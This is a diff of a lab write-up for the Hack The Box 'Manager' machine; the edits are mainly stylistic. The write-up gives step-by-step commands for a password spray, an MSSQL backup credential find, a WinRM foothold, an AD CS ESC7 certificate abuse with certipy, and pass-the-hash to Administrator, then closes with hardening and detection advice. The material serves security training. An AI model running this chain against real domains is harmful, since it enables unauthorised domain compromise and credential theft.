@@ -37,7 +37,7 @@ outcome: "Standard-user WinRM foothold and Administrator NT-hash recovery via ES
 
 ## RID spray to AD CS ESC7
 
-Manager is a Medium-rated Hack The Box Active Directory lab. RID brute forcing enumerates domain users and a username-as-password spray recovers one account; MSSQL access as that account exposes an old website backup holding a second credential; and the second account holds `ManageCA` rights over the Enterprise CA, enabling the AD CS ESC7 chain — officer assignment, template enablement, failed-request issuance, certificate retrieval, and NT-hash recovery for domain compromise. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).
+Manager is a Medium-rated Hack The Box Active Directory lab. RID brute forcing enumerates domain users, and a username-as-password spray recovers one account. MSSQL access as that account exposes an old website backup holding a second credential, and the second account holds `ManageCA` rights over the Enterprise CA. Those rights enable the AD CS ESC7 chain: officer assignment, template enablement, failed-request issuance, certificate retrieval, and NT-hash recovery for domain compromise. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).
 
 **Attack path:** **RID brute forcing → username-as-password spray → MSSQL backup discovery → WinRM foothold → BloodHound rights collection → AD CS ESC7 (officer assignment → template enablement → failed-request issuance → certificate retrieval) → NT-hash recovery → pass-the-hash Administrator**
 
@@ -45,7 +45,7 @@ Manager is a Medium-rated Hack The Box Active Directory lab. RID brute forcing e
 
 - **Target:** a Windows Active Directory domain whose Domain Controller also hosts an Enterprise CA (AD CS), alongside MSSQL (1433), SMB (445), and WinRM (5985).
 - **Starting position:** unauthenticated network access, with no credentials provided.
-- **Objective:** enumerate domain users, recover initial credentials, and escalate to domain compromise through AD CS abuse rather than a software memory-corruption or remote-code-execution flaw.
+- **Objective:** enumerate domain users, recover initial credentials, and escalate to domain compromise through AD CS abuse, not a software memory-corruption or remote-code-execution flaw.
 - **Environment:** Hack The Box lab; all activity was confined to the platform's isolated lab environment.
 
 ## Evidence: RID spray, MSSQL backup, and ESC7 to DA
@@ -98,7 +98,7 @@ Significance: usernames are discoverable without credentials, and one account ac
 
 Result: valid credentials for one domain account were recovered and validated through SMB authentication.
 
-### 3. MSSQL Enumeration — Legacy Backup Discovery
+### 3. MSSQL Enumeration: Legacy Backup Discovery
 
 Observation: the recovered credential authenticates to MSSQL through Windows authentication.
 
@@ -146,7 +146,7 @@ Significance: collecting AD objects and ACL edges as an authenticated domain use
 
 Result: domain objects and privilege edges were collected for the second account.
 
-### 5. Foothold — WinRM Login
+### 5. Foothold: WinRM Login
 
 Observation: the second account has WinRM access, and the recovered credential fits it.
 
@@ -166,7 +166,7 @@ Significance: this confirms the recovered credential is valid and yields interac
 
 Result: an interactive WinRM session as `<SECOND_USER>` was established.
 
-### 6. AD CS ESC7 — CA Officer and Template Abuse
+### 6. AD CS ESC7: CA Officer and Template Abuse
 
 Observation: the second account holds `ManageCA` rights over the Enterprise CA (`<CA_NAME>`), which ESC7 abuses to issue certificates for high-value accounts.
 
@@ -182,7 +182,7 @@ certipy find \
 
 The vulnerable path is ESC7 through CA officer and template manipulation.
 
-Step 1 — Add the second account as a CA officer:
+Step 1: Add the second account as a CA officer:
 
 ```bash
 certipy ca \
@@ -192,7 +192,7 @@ certipy ca \
   -p '<SECOND_PASSWORD>'
 ```
 
-Step 2 — Enable the `SubCA` template:
+Step 2: Enable the `SubCA` template:
 
 ```bash
 certipy ca \
@@ -202,7 +202,7 @@ certipy ca \
   -enable-template 'SubCA'
 ```
 
-Step 3 — Request a SubCA certificate as Administrator; the request fails, but a request ID is created:
+Step 3: Request a SubCA certificate as Administrator; the request failed, but it created a request ID. I kept the request ID because a CA officer can still issue it.
 
 ```bash
 certipy req \
@@ -213,7 +213,7 @@ certipy req \
   -upn administrator@<DOMAIN>
 ```
 
-Step 4 — Issue the failed request as a CA officer:
+Step 4: Issue the failed request as a CA officer:
 
 ```bash
 certipy ca \
@@ -223,7 +223,7 @@ certipy ca \
   -issue-request <REQUEST_ID>
 ```
 
-Step 5 — Retrieve the issued certificate:
+Step 5: Retrieve the issued certificate:
 
 ```bash
 certipy req \
@@ -233,7 +233,7 @@ certipy req \
   -retrieve <REQUEST_ID>
 ```
 
-Step 6 — Authenticate with the retrieved certificate and recover the Administrator NT hash:
+Step 6: Authenticate with the retrieved certificate and recover the Administrator NT hash:
 
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip <TARGET_IP>
@@ -244,11 +244,11 @@ Got hash for 'administrator@<DOMAIN>':
 <LM_HASH>:<NT_HASH>
 ```
 
-Significance: ESC7 chains `ManageCA` rights through officer assignment, template enablement, and failed-request issuance to obtain a certificate for any account; PKINIT authentication with that certificate exposes the account's NT hash, enabling pass-the-hash without cracking.
+Significance: ESC7 chains `ManageCA` rights through officer assignment, template enablement, and failed-request issuance to obtain a certificate for any account. PKINIT authentication with that certificate exposes the account's NT hash, so pass-the-hash needs no cracking.
 
 Result: an Administrator certificate was issued and its PKINIT authentication returned the Administrator NT hash.
 
-### 7. Full Compromise — Pass-the-Hash
+### 7. Full Compromise: Pass-the-Hash
 
 Observation: the recovered NT hash can authenticate directly, without the plaintext password.
 
@@ -275,13 +275,13 @@ Result: an interactive Administrator session was established.
 
 ## Outcome: WinRM foothold and Administrator NT hash
 
-Authenticated user access is established by validated SMB and WinRM sessions, and administrative control is established by a pass-the-hash Administrator session against the recovered NT hash. The escalation relies on a weak credential policy, a legacy backup exposed through MSSQL filesystem access, and an over-privileged `ManageCA` right. Passwords, hashes, addresses, and domain/host/CA identifiers are omitted, and the ESC7 sub-steps for which the source captured no tool output are reported as source-recorded rather than output-verified.
+Authenticated user access rests on validated SMB and WinRM sessions, and administrative control rests on a pass-the-hash Administrator session against the recovered NT hash. The escalation relies on a weak credential policy, a legacy backup exposed through MSSQL filesystem access, and an over-privileged `ManageCA` right. Passwords, hashes, addresses, and domain/host/CA identifiers are omitted, and where the source captured no tool output for the ESC7 sub-steps I could not verify them, so they are reported as source-recorded rather than output-verified.
 
 ## Recommendations: user enumeration, backup secrets, and ManageCA rights
 
 Every action below is a recommendation; none was validated in the lab.
 
-1. **Usernames are enumerable and reused as passwords.** Root cause: RID enumeration exposes account names, and at least one account's password equals its username. Demonstrated impact: a single low-noise spray recovered a working domain credential. *Recommendation:* enforce length and complexity policy, reject usernames and common patterns as passwords, and set lockout thresholds. *Detection:* alert on repeated authentication failures or many distinct accounts attempted from one source.
+1. **Usernames are enumerable and reused as passwords.** Root cause: RID enumeration exposes account names, and at least one account's password equals its username. Demonstrated impact: a single quiet spray recovered a working domain credential. *Recommendation:* enforce length and complexity policy, reject usernames and common patterns as passwords, and set lockout thresholds. *Detection:* alert on repeated authentication failures or many distinct accounts attempted from one source.
 2. **MSSQL filesystem access exposed a legacy backup with a plaintext credential.** Root cause: authenticated MSSQL access could read a web-root backup whose configuration file stored a credential in cleartext. Demonstrated impact: a more privileged account's credential was recovered without exploitation. *Recommendation:* remove secrets from backups and configuration files, restrict the database service's filesystem reach, and rotate any credential that has ever appeared in a backup. *Validation:* scan backup and export artifacts for secrets before storage.
 3. **An over-privileged `ManageCA` right enabled ESC7.** Root cause: a standard user held `ManageCA` over the Enterprise CA, permitting officer assignment and template enablement. Demonstrated impact: a certificate for the Administrator account was issued and its NT hash recovered, yielding full domain compromise. *Recommendation:* restrict CA officer and CA-manager rights to dedicated administrative accounts, and review certificate templates for sensitive enrollee permissions. *Detection:* alert on CA officer additions, template enablement, and failed-then-issued request sequences.
 
